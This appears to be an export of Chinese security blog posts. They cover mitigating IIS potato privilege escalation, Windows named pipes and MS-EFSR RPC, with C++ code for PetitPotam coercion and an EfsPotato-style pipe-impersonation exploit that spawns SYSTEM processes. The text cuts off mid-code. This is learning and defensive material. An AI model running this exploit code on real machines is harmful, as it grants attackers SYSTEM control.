<h1 id="1-删除模拟特权"><a href="#1-删除模拟特权" class="headerlink" title="1. 删除模拟特权"></a>1. 删除模拟特权</h1><p>删除 IIS_IUSRS 组的特权即可<br><img src="/2023/09/24/IIS%E5%9C%9F%E8%B1%86%E6%8F%90%E6%9D%83%E4%BF%AE%E5%A4%8D/image-20230924171421507.png" alt="image-20230924171421507"><br>将 IIS_IUSRS 组的模拟特权删除，然后重启机器后重启 IIS 服务即可。<br>自动化方案</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">$secpolcfg = <span class="string">&quot;C:\Windows\Temp\secpol.cfg&quot;</span></span><br><span class="line">secedit /export /cfg $secpolcfg</span><br><span class="line">(Get-Content $secpolcfg) -replace <span class="string">&quot;SeImpersonatePrivilege = .*$&quot;</span>, <span class="string">&quot;SeImpersonatePrivilege = *S-1-5-32-544,*S-1-5-6&quot;</span> | Out-File $secpolcfg</span><br><span class="line">secedit /configure /db c:\windows\security\local.sdb /cfg $secpolcfg /areas user_rights</span><br><span class="line">rm -force $secpolcfg -confirm:$<span class="literal">false</span></span><br></pre></td></tr></table></figure>
<h1 id="2-修改默认应用程序池的身份标识"><a href="#2-修改默认应用程序池的身份标识" class="headerlink" title="2. 修改默认应用程序池的身份标识"></a>2. 修改默认应用程序池的身份标识</h1><p><a href="https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities">https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities</a><br>默认网站的应用程序池的标识是 ApplicationPoolIdentity ，所以很多情况下攻击者在拿到 webshell 的情况下的权限是 DefaultAppPool/ApplicationPoolIdentity ，这个用户是有模拟特权的。<br><img src="/2023/09/24/IIS%E5%9C%9F%E8%B1%86%E6%8F%90%E6%9D%83%E4%BF%AE%E5%A4%8D/image-20230924171440756.png" alt="image-20230924171440756"></p>
<p>可以新建一个普通用户来替换该用户。<br><img src="/2023/09/24/IIS%E5%9C%9F%E8%B1%86%E6%8F%90%E6%9D%83%E4%BF%AE%E5%A4%8D/image-20230924171452221.png" alt="image-20230924171452221"></p>
<p><img src="/2023/09/24/IIS%E5%9C%9F%E8%B1%86%E6%8F%90%E6%9D%83%E4%BF%AE%E5%A4%8D/image-20230924171503121.png" alt="image-20230924171503121"><br>这时拿到的 webshell 权限即为 DefaultAppPool/test 。是默认普通用户组的权限。</p>
]]></content>
      <categories>
        <category>windows</category>
      </categories>
      <tags>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>windows RPC学习</title>
    <url>/2023/10/29/RPC%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>rpcview<br><a href="https://ci.appveyor.com/project/silverf0x/rpcview/build/artifacts">https://ci.appveyor.com/project/silverf0x/rpcview/build/artifacts</a></p>
<h2 id="命名管道"><a href="#命名管道" class="headerlink" title="命名管道"></a>命名管道</h2><p>管道分为匿名管道和命名管道。<br>匿名管道不能通过网络使用，也不能在不相关的进程之间使用。<br>命名管道是 Windows 操作系统中的一种进程间通信（IPC）机制。命名管道允许两个独立进程之间通过共享名称来进行单向或双向数据通信。命名管道可以在本地计算机上运行（IPC），也可以在计算机网络上运行（RPC）。<br>命名管道的主要作用是允许不同应用程序之间的数据通信。这种通信方式适用于需要长时间通信的进程，例如，一个应用程序可以使用命名管道与另一个应用程序进行通信，以在它们之间共享数据。<br>通常，命名管道服务器进程会创建具有已知名称或要与其客户端通信的名称的命名管道。知道管道名称的命名管道客户端进程可以打开其另一端，但受命名管道服务器进程指定的访问限制。服务器和客户端都连接到管道后，可以通过对管道执行读取和写入操作来交换数据。</p>
<h3 id="命名管道通信demo"><a href="#命名管道通信demo" class="headerlink" title="命名管道通信demo"></a>命名管道通信demo</h3><p>CreateNamedPipeA创建命名管道，该函数返回一个句柄，这时，server进程可以使用ConnectNamedPipe等待客户端的连接，在客户端连接上命名管道后，server进程可以调用ReadFile读取客户端发来的管道数据。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;conio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFSIZE 256</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> _tmain(<span class="keyword">int</span> argc, TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	HANDLE hNamedPipe = <span class="literal">NULL</span>;</span><br><span class="line">	LPCWSTR lpName = <span class="string">L&quot;\\\\.\\pipe\\pipename&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*] Creating named pipe and wait for connection.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	hNamedPipe = <span class="built_in">CreateNamedPipe</span>(</span><br><span class="line">		lpName,</span><br><span class="line">		PIPE_ACCESS_DUPLEX,</span><br><span class="line">		PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,</span><br><span class="line">		PIPE_UNLIMITED_INSTANCES,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		NMPWAIT_WAIT_FOREVER,</span><br><span class="line">		<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (hNamedPipe != INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[*] Created named pipe \\\\.\\pipe\\pipename succeeded.\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[-] CreateNamedPipe() Error: %i.\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// waiting to be connected</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">ConnectNamedPipe</span>(hNamedPipe, <span class="literal">NULL</span>) != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[*] The connection is successful, start receiving datas.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Receive data from the server</span></span><br><span class="line">		BOOL fSuccess = FALSE;</span><br><span class="line">		DWORD len = <span class="number">0</span>;</span><br><span class="line">		CHAR buffer[BUFSIZE];</span><br><span class="line">		string revDatas = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">do</span></span><br><span class="line">		&#123;</span><br><span class="line">			fSuccess = <span class="built_in">ReadFile</span>(hNamedPipe, buffer, BUFSIZE * <span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">char</span>), &amp;len, <span class="literal">NULL</span>);</span><br><span class="line">			<span class="keyword">char</span> buffer2[BUFSIZE + <span class="number">1</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">			<span class="built_in">memcpy</span>(buffer2, buffer, len);</span><br><span class="line">			revDatas.<span class="built_in">append</span>(buffer2);</span><br><span class="line">			<span class="keyword">if</span> (!fSuccess || len &lt; BUFSIZE)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">while</span> (<span class="literal">true</span>);</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;[*] Received data:&quot;</span> &lt;&lt; endl &lt;&lt; revDatas.<span class="built_in">c_str</span>() &lt;&lt; endl &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">DisconnectNamedPipe</span>(hNamedPipe);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(hNamedPipe);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*] Close named pipe.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>客户端使用CreateFile连接至正在监听的命名管道。连接成功后，此时，server端调用的ConnectNamedPipe也返回，客户端可以通过WriteFile向管道中写入数据</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;conio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFSIZE 5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> _tmain(<span class="keyword">int</span> argc, TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	HANDLE hNamedPipe = <span class="literal">NULL</span>;</span><br><span class="line">	LPCWSTR lpNamedPipeName = <span class="string">L&quot;\\\\.\\pipe\\pipename&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*] Named Pipes: Client goes online.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*] Press any key to start connecting named pipes.\n&quot;</span>);</span><br><span class="line">	_getch();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">WaitNamedPipe</span>(lpNamedPipeName, NMPWAIT_WAIT_FOREVER))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*] Opening named pipe \\\\.\\pipe\\pipename.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	hNamedPipe = <span class="built_in">CreateFile</span>(lpNamedPipeName, GENERIC_READ | GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (hNamedPipe != INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[*] The connection is successful, start sending data.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">		DWORD nNumberOfBytesToWrite;</span><br><span class="line">		<span class="keyword">const</span> <span class="keyword">char</span>* lpBuffer = <span class="string">&quot;Pipe datas from client...&quot;</span>;</span><br><span class="line">		<span class="keyword">if</span> (!<span class="built_in">WriteFile</span>(hNamedPipe, lpBuffer, <span class="built_in">strlen</span>(lpBuffer), &amp;nNumberOfBytesToWrite, <span class="literal">NULL</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Write failed...&quot;</span>);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;[*] Sent data: &quot;</span> &lt;&lt; endl &lt;&lt; lpBuffer &lt;&lt; endl &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[-] CreateFile() Error: %i.\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">FlushFileBuffers</span>(hNamedPipe);</span><br><span class="line">	<span class="built_in">DisconnectNamedPipe</span>(hNamedPipe);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(hNamedPipe);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以通过微软官网的的pipelist来枚举管道列表</p>
<h2 id><a href="#" class="headerlink" title></a><img src="/2023/10/29/RPC%E5%AD%A6%E4%B9%A0/image-20231029003646448.png" alt="image-20231029003646448"></h2><h2 id="MS-EFSR协议"><a href="#MS-EFSR协议" class="headerlink" title="MS-EFSR协议"></a>MS-EFSR协议</h2><p><a href="https://learn.microsoft.com/zh-cn/openspecs/windows_protocols/ms-efsr/2425f825-aa14-4895-a159-4122927dec7c">https://learn.microsoft.com/zh-cn/openspecs/windows_protocols/ms-efsr/2425f825-aa14-4895-a159-4122927dec7c</a><br>根据文档描述EFSRPC协议必须通过\pipe\lsarpc或者\pipe\efsrpc管道通信，且两个管道对应的UUID必须为c681d488-d850-11d0-8c52-00c04fd90f7e或者df1941c5-fe89-4e79-bf10-463657acf44d。</p>
<h3 id="PetitPotam–EfsRpcOpenFileRaw"><a href="#PetitPotam–EfsRpcOpenFileRaw" class="headerlink" title="PetitPotam–EfsRpcOpenFileRaw"></a>PetitPotam–EfsRpcOpenFileRaw</h3><p>PetitPotam是一个默认匿名强制服务器到指定IP进行身份认证的一个漏洞。主要利用为强制DC到中继服务器进行认证，由中继服务器转发到ADCS申请证书，获得**DC$**的权限。</p>
<p>petitPotam利用的就是 MS-EFSR 协议，该协议是对远程存储和通过网络访问的加密数据进行维护和管理的。协议中的<strong>EfsRpcOpenFileRaw</strong> API 是通常用于备份软件，功能是打开一个文件。该协议接口存在一系列函数，其FileName参数可以指定UNC路径。<br><img src="/2023/10/29/RPC%E5%AD%A6%E4%B9%A0/1675855574378-1eaea97b-e0fd-4996-8c70-7f21e1f34697.png" alt="image.png"></p>
<p>在rpcview中选中该uuid 进行反编译可以得到IDL,该uuid在上文中提到过，对应的管道为 \pipe\lsarp.<br><img src="/2023/10/29/RPC%E5%AD%A6%E4%B9%A0/image-20231029003730919.png" alt="image-20231029003730919"></p>
<p>获得idl后就可以开心code了</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;ms-efsr_h.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;strsafe.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;RpcRT4.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    RPC_STATUS status;</span><br><span class="line">    RPC_BINDING_HANDLE binding;</span><br><span class="line">    RPC_WSTR StringBinding;</span><br><span class="line"></span><br><span class="line">    status = <span class="built_in">RpcStringBindingCompose</span>(</span><br><span class="line">        (RPC_WSTR)<span class="string">L&quot;c681d488-d850-11d0-8c52-00c04fd90f7e&quot;</span>,</span><br><span class="line">        (RPC_WSTR)<span class="string">L&quot;ncacn_np&quot;</span>,</span><br><span class="line">        (RPC_WSTR)<span class="string">L&quot;\\\\127.0.0.1&quot;</span>,</span><br><span class="line">        (RPC_WSTR)<span class="string">L&quot;\\pipe\\lsass&quot;</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        &amp;StringBinding</span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">wprintf</span>(<span class="string">L&quot;[+] RpcStringBindingCompose status:%d\n&quot;</span>, status);</span><br><span class="line">    <span class="built_in">wprintf</span>(<span class="string">L&quot;[*] String binding: %ws\r\n&quot;</span>, StringBinding);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//绑定接口</span></span><br><span class="line">    status = <span class="built_in">RpcBindingFromStringBinding</span>(StringBinding, &amp;binding);</span><br><span class="line">    <span class="built_in">wprintf</span>(<span class="string">L&quot;[+] RpcBindingFromStringBinding status:%d\n&quot;</span>, status);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//释放资源</span></span><br><span class="line">    status = <span class="built_in">RpcStringFree</span>(&amp;StringBinding);</span><br><span class="line">    <span class="built_in">wprintf</span>(<span class="string">L&quot;[+] RpcStringFree status:%d\n&quot;</span>, status);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//调用rpc</span></span><br><span class="line">    RpcTryExcept&#123;</span><br><span class="line">        PVOID pContext;</span><br><span class="line">    LPWSTR pwszFileName;</span><br><span class="line">    pwszFileName = (LPWSTR)<span class="built_in">LocalAlloc</span>(LPTR, MAX_PATH * <span class="built_in"><span class="keyword">sizeof</span></span>(WCHAR));</span><br><span class="line">    <span class="built_in">StringCchPrintf</span>(pwszFileName, MAX_PATH, <span class="string">L&quot;\\\\127.0.0.1\\C$\\tmp\\test.txt&quot;</span>);</span><br><span class="line">    <span class="keyword">long</span> result;</span><br><span class="line">    <span class="built_in">wprintf</span>(<span class="string">L&quot;[*] EfsRpcOpenFileRaw target file: %ws\r\n &quot;</span>, pwszFileName);</span><br><span class="line">    result = <span class="built_in">Proc0_EfsRpcOpenFileRaw_Downlevel</span>(binding, &amp;pContext, pwszFileName, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">wprintf</span>(<span class="string">L&quot;[*] EfsRpcOpenFileRaw status: %d\n&quot;</span>, result);</span><br><span class="line"></span><br><span class="line">    status = <span class="built_in">RpcBindingFree</span>(&amp;binding);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">RpcExcept</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">wprintf</span>(<span class="string">L&quot;[-]RpcExceptionCode: %d\n&quot;</span>, <span class="built_in">RpcExceptionCode</span>());</span><br><span class="line">    &#125;RpcEndExcept</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> __RPC_FAR* __RPC_USER <span class="title">midl_user_allocate</span><span class="params">(<span class="keyword">size_t</span> cBytes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span>((<span class="keyword">void</span> __RPC_FAR*) <span class="built_in">malloc</span>(cBytes));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> __RPC_USER <span class="title">midl_user_free</span><span class="params">(<span class="keyword">void</span> __RPC_FAR* p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>code完成后，可以用ProcMon监视一下，可以看到创建了lsass管道，但是因为我的虚拟机安装了补丁，这里会报错 RpcExceptionCode : 5,<br><img src="/2023/10/29/RPC%E5%AD%A6%E4%B9%A0/image-20231029003745786.png" alt="image-20231029003745786"><br>换一个 未打补丁的虚拟机即可<br><img src="/2023/10/29/RPC%E5%AD%A6%E4%B9%A0/image-20231029003752173.png" alt="image-20231029003752173"><br>这个时候，只需要加上提权代码即可。同时利用一个trick，如果我们指定管道路径为 \127.0.0.1/pipe/pipename\C$\test.txt，当客户端连接时，会自动将其转换为\127.0.0.1\pipe\pipename\PIPE\srvsvc，如下图所示。通过这一点可以欺骗客户端连接至我们控制的命名管道。</p>
<h3 id="EFS提权"><a href="#EFS提权" class="headerlink" title="EFS提权"></a>EFS提权</h3><p><a href="https://github.com/zcgonvh/EfsPotato/pull/5">https://github.com/zcgonvh/EfsPotato/pull/5</a><br>需要注意的是efspotato在最新版的Windows中已经不适用了，为efs rpc设置了它的认证等级，我们需要在调用前设置rpc的认证等级为RPC_C_AUTHN_LEVEL_PKT_PRIVACY</p>
<p>代码为</p>
<p>除此之外，该协议也可以也可以结合土豆提权的原理进行本地提权<br>比如：<br>当我们要求目标服务器请求的地址为\IP/pipe/sss\filename的时候，lsass.exe请求的管道变成了\IP\pipe\sss\PIPE\srvsvc。而此时\IP\pipe\sss\PIPE\srvsvc是一个不存在的管道，如果我们手动创建该管道，并在该管道中设置特殊的服务操作。例如将模拟连接的用户权限，创建指定的任意进程。我们即完成了提权。<br><img src="/2023/10/29/RPC%E5%AD%A6%E4%B9%A0/1675870350162-0a2da4da-4b1f-4177-9d33-2f0bed50be7d.png" alt="image.png"><br><img src="/2023/10/29/RPC%E5%AD%A6%E4%B9%A0/1675870244257-fd00de9f-b727-41c0-a553-8dfc03b94135.png" alt="image.png"></p>
<h4 id="提权流程"><a href="#提权流程" class="headerlink" title="提权流程"></a>提权流程</h4><h5 id="CreateNamedPipe"><a href="#CreateNamedPipe" class="headerlink" title="CreateNamedPipe"></a>CreateNamedPipe</h5><p>监听管道\\.\pipe\lsarpc\pipe\srvsvc，等待回连<br>创建匿名管道，lpname指定管道名称（pipe name）。由于管道服务器无法在另一台计算机上创建管道，因此 CreateNamedPipe() 函数必须使用句点 **. **作为服务器名称：<br>\.\pipe\PipeName</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">LaunchPetitNamedPipeServer</span><span class="params">(LPVOID lpParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hNamedPipe = <span class="literal">NULL</span>;</span><br><span class="line">    LPWSTR lpName;</span><br><span class="line">    LPWSTR lpCommandLine = (LPWSTR)lpParam;</span><br><span class="line"></span><br><span class="line">    SECURITY_DESCRIPTOR sd = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    SECURITY_ATTRIBUTES sa = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    lpName = (LPWSTR)<span class="built_in">LocalAlloc</span>(LPTR, MAX_PATH * <span class="built_in"><span class="keyword">sizeof</span></span>(WCHAR));</span><br><span class="line">    <span class="built_in">StringCchPrintf</span>(lpName, MAX_PATH, <span class="string">L&quot;\\\\.\\pipe\\lsarpc\\pipe\\srvsvc&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((hNamedPipe = <span class="built_in">CreateNamedPipe</span>(lpName, PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_WAIT, <span class="number">10</span>, <span class="number">2048</span>, <span class="number">2048</span>, <span class="number">0</span>, &amp;sa)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n[+] Malicious named pipe running on %S.\n&quot;</span>, lpName);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] ImpersonateNamedPipeClient() Error: %i.\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">ConnectNamedPipe</span>(hNamedPipe, <span class="literal">NULL</span>) != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] The connection is successful.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] ConnectNamedPipe() Error: %i.\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">GetSystem</span>(hNamedPipe, lpCommandLine);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hNamedPipe);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="GetSystem"><a href="#GetSystem" class="headerlink" title="GetSystem"></a>GetSystem</h5><p>设置回连后的恶意操作提权为system</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">STARTUPINFO si;</span><br><span class="line">PROCESS_INFORMATION pi;</span><br><span class="line"></span><br><span class="line">HANDLE hProcess;</span><br><span class="line">HANDLE hToken = <span class="literal">NULL</span>;</span><br><span class="line">HANDLE phNewToken = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">LPWSTR lpCurrentDirectory = <span class="literal">NULL</span>;</span><br><span class="line">LPVOID lpEnvironment = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// clear a block of memory</span></span><br><span class="line"><span class="built_in">ZeroMemory</span>(&amp;si, <span class="built_in"><span class="keyword">sizeof</span></span>(si));</span><br><span class="line">si.cb = <span class="built_in"><span class="keyword">sizeof</span></span>(si);</span><br><span class="line"><span class="built_in">ZeroMemory</span>(&amp;pi, <span class="built_in"><span class="keyword">sizeof</span></span>(pi));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">ImpersonateNamedPipeClient</span>(hNamedPipe))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] ImpersonateNamedPipeClient success.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] ImpersonateNamedPipeClient() Error: %i.\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">OpenThreadToken</span>(<span class="built_in">GetCurrentThread</span>(), TOKEN_ALL_ACCESS, FALSE, &amp;hToken))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] OpenThreadToken success.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] OpenThreadToken() Error: %i.\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">DuplicateTokenEx</span>(hToken, TOKEN_ALL_ACCESS, <span class="literal">NULL</span>, SecurityImpersonation, TokenPrimary, &amp;phNewToken))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] DuplicateTokenEx success.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] DupicateTokenEx() Error: %i.\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(lpCurrentDirectory = (LPWSTR)<span class="built_in">malloc</span>(MAX_PATH * <span class="built_in"><span class="keyword">sizeof</span></span>(WCHAR))))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">GetSystemDirectory</span>(lpCurrentDirectory, MAX_PATH))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] GetSystemDirectory() Error: %i.\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">CreateEnvironmentBlock</span>(&amp;lpEnvironment, phNewToken, FALSE))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] CreateEnvironmentBlock() Error: %i.\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">CreateProcessAsUser</span>(phNewToken, <span class="literal">NULL</span>, lpCommandLine, <span class="literal">NULL</span>, <span class="literal">NULL</span>, TRUE, CREATE_UNICODE_ENVIRONMENT, lpEnvironment, lpCurrentDirectory, &amp;si, &amp;pi))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] CreateProcessAsUser success.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CloseHandle</span>(hToken);</span><br><span class="line">    <span 